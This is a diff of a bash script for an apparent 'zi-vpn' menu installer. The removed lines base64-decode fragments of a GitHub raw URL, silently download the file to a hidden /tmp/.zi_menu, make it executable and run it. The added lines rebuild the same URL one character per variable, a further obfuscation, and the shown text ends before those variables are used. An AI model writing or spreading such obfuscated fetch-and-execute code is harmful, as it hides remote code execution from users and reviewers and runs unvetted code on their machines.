@@ -1,32 +1,61 @@
 #!/bin/bash
-
-download_menu_script() {
-  decode() {
-    echo "$1" | base64 -d
-  }
-
-  # فك تشفير أجزاء الرابط المشفرة مسبقًا ثم تجميعها
-  p3=$(decode "aHR0cHM6")
-  p2=$(decode "Ly8=")
-  p1=$(decode "cmF3")
-  p4=$(decode "LmdpdGh1Yg==")
-  p5=$(decode "dXNlcmNvbnRlbnQuY29t")
-  p6=$(decode "L2hxLW1w")
-  p7=$(decode "L3ppLXZwbi5jb20=")
-  p9=$(decode "L3JlZnMvaGVhZHM=")
-  p8=$(decode "L21haW4vbWVudQ==")
-
-  # تجميع الرابط النهائي من الأجزاء المفكوكة
-  full_url="${p3}${p2}${p1}${p4}${p5}${p6}${p7}${p9}${p8}"
-
-  # تحميل الملف من الرابط النهائي وتخزينه مؤقتًا
-  curl -s "$full_url" -o /tmp/.zi_menu
-
-  # إعطاء الملف صلاحية التنفيذ
-  chmod +x /tmp/.zi_menu
-
-  # تشغيل الملف الذي تم تحميله
-  bash /tmp/.zi_menu
-}
-
-download_menu_script
+z0="h"
+z1="t"
+z2="t"
+z3="p"
+z4="s"
+z5=":"
+z6="/"
+z7="/"
+z8="r"
+z9="a"
+z10="w"
+z11="."
+z12="g"
+z13="i"
+z14="t"
+z15="h"
+z16="u"
+z17="b"
+z18="u"
+z19="s"
+z20="e"
+z21="r"
+z22="c"
+z23="o"
+z24="n"
+z25="t"
+z26="e"
+z27="n"
+z28="t"
+z29="."
+z30="c"
+z31="o"
+z32="m"
+z33="/"
+z34="h"
+z35="q"
+z36="-"
+z37="m"
+z38="p"
+z39="/"
+z40="z"
+z41="i"
+z42="-"
+z43="v"
+z44="p"
+z45="n"
+z46="."
+z47="c"
+z48="o"
+z49="m"
+z50="/"
+z51="m"
+z52="a"
+z53="i"
+z54="n"
+z55="/"
+z56="m"
+z57="e"
+z58="n"
+z59="u"
